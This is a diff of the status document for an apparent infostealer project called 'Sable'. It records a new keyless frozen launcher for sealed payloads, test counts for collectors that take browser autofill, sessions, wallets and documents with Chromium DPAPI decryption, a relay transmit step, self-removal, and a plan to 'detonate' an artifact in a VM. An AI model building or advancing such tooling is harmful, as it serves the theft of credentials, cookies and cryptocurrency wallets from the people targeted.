@@ -88,7 +88,8 @@ Four gate-table rows were folded rather than omitted, each named in `DECISIONS.m
 `theme/__init__.py` into `app/main.py`, and `model.py` into `app/worker.py` plus
 `core/validate.py`. That is why `app/` is 14 slots and not 18.
 
-Nothing is open. What remains is not code: the frozen launcher (§9) and a VM run.
+Nothing is open. The frozen launcher now exists and is proven (§9). What remains is not
+code: one VM run.
 
 ---
 
@@ -96,17 +97,21 @@ Nothing is open. What remains is not code: the frozen launcher (§9) and a VM ru
 
 Nothing below is a claim; each line is a test that ran on Windows 11, CPython 3.12.10.
 
-- `pytest` — **125 passed**. Manifest parity both directions, AST import direction,
+- `pytest` — **132 passed**. Manifest parity both directions, AST import direction,
   config error paths, and the four inter-module contracts.
 - `ruff check .` — clean, with `E`, `F`, `W`, `I`, `B`, `UP`, `SIM`, `RUF` enabled.
-- `compileall` — clean over `agent/`, `core/`, `app/`, `tests/`.
+- `compileall` — clean over `agent/`, `core/`, `app/`, `tests/`, `tools/`.
 - **Seal ↔ loader, both halves.** `core/seal.py` seals, `agent/loader.py` opens; wrong
   key, truncation, ciphertext bit-flip and tag bit-flip all raise `ArchiveError`. The
   duplicated constants are pinned equal by test, so the format cannot drift quietly.
-- **Forge contract, 31 checks.** Payload members, literal rewrite, working tree
-  untouched, schema copied verbatim, `cfg.json` round-trip, container size, footer
-  magic and offset, the loader's own footer parser reading back what the forge wrote,
-  ballast offset and size, script output parsing, six refusal paths.
+- **Forge contract, 45 checks.** Payload members, loader shipped verbatim, schema
+  copied verbatim, `cfg.json` round-trip, trailer slots and width, container size,
+  footer magic and offset, the loader's own trailer and footer parsers reading back
+  what the forge wrote, two artifacts sharing one launcher and not each other's keys,
+  ballast offset and size, script output parsing and its mutex guard, eight refusals.
+- **Launcher, 37 checks.** `tools/dist/sable-launcher.exe` opens two artifacts sealed
+  with different keys, boots each, and imports the payload out of the decrypted
+  archive. A bare launcher with no trailer exits 1 instead of hanging.
 - **Validate and pipeline, 58 checks.** Six rules, never raises, blocking subset,
   progress monotonic across six stages, cancellation between stages, a failed rename
   that keeps the artifact.
@@ -163,10 +168,11 @@ registry.
 | File | Covers | Result |
 |---|---|---|
 | `sable_validate.py` | Six rules plus pipeline stages | 58/58 |
-| `sable_forge.py` | Forge payload, container, seal, refusals | 31/31 |
+| `sable_forge.py` | Forge payload, trailer, container, seal, refusals | 45/45 |
+| `sable_launcher.py` | Frozen launcher booting two artifacts | 37/37 |
 | `sable_gecko.py` | Both gecko layouts | 22/22 |
 | `sable_ui.py` | Widgets, rail, worker thread, real build | 35/35 |
-| `sable_window.py` | Whole window, gate, theme switch | 27/27 |
+| `sable_window.py` | Whole window, gate, theme switch | 29/29 |
 | `sable_fixture.py` | Chromium fixtures with real DPAPI | — |
 | `sable_sandbox2.py` | autofill / sessions / wallets / documents | 25/25 |
 | `live_chrome.py` | Live probe; `--abe-unwrap` dispatch | — |
@@ -210,16 +216,17 @@ says so instead of silently ignoring the number.
 half-written container in the output directory. The flag is read at the six stage
 boundaries and nowhere else.
 
+**The launcher carries no key.** The seal key and the mutex name live in a 868-byte
+trailer between the sealed blob and the footer — `b"SBLK"`, a 64-byte key slot, an
+800-byte mutex slot. `agent/loader.py` reads it, so one frozen launcher opens any
+artifact and re-freezing is only needed when the loader changes. The alternative —
+patching the two literals into `agent/loader.py` at build time, which is what the first
+three phases did — is gone, and the payload now ships `agent/` byte for byte.
+`tools/` is outside `MANIFEST.txt` because it is build tooling, not shipping source.
+
 ---
 
 ## 9. Open questions
-
-**The frozen launcher is not a manifest slot.** `forge.build(..., mode="exe")`
-requires a `stub` path — a PyInstaller onefile build of `agent/loader.py`. It does not
-exist yet. Until it does, `py` mode is the only runnable output. The forge test uses
-4 KiB of random bytes, which proves the container, not the launcher. Building it is
-`pyinstaller --onefile agent/loader.py` on the target platform, then pointing the Forge
-page at the result.
 
 **Known and deliberately unfixed**, both recorded in `DECISIONS.md`:
 `relay.transmit` retries deterministic failures three times before failing, and
@@ -228,7 +235,8 @@ skipped.
 
 **Live VM run not performed.** Every Windows path below the source modules has been
 exercised on this machine, but no artifact has been detonated in a throwaway VM. That
-is the one check a sandbox cannot make.
+is the one check a sandbox cannot make. The launcher boot proof deliberately runs a
+fake payload so the real collectors never execute here.
 
 ---
 
@@ -236,11 +244,11 @@ is the one check a sandbox cannot make.
 
 No code is owed. In order:
 
-1. Build the frozen launcher, point the Forge page at it, and confirm `exe` mode
-   produces an artifact that runs.
-2. Run one `py` artifact in a throwaway VM against a relay you control: collection,
-   transmit, and `self_remove` if it is switched on.
-3. Only then decide whether the two deliberately-unfixed items in §9 matter.
+1. Run one artifact — `py` or `exe`, both now runnable — in a throwaway VM against a
+   relay you control: collection, transmit, and `self_remove` if it is switched on.
+2. Only then decide whether the two deliberately-unfixed items in §9 matter.
+3. Chrome folder-grab is a separate ticket: raw profile folders as well as on-target
+   decryption, and it needs a transport answer before it is worth building.
 
 The acceptance checklist the build was measured against, with its current state:
 
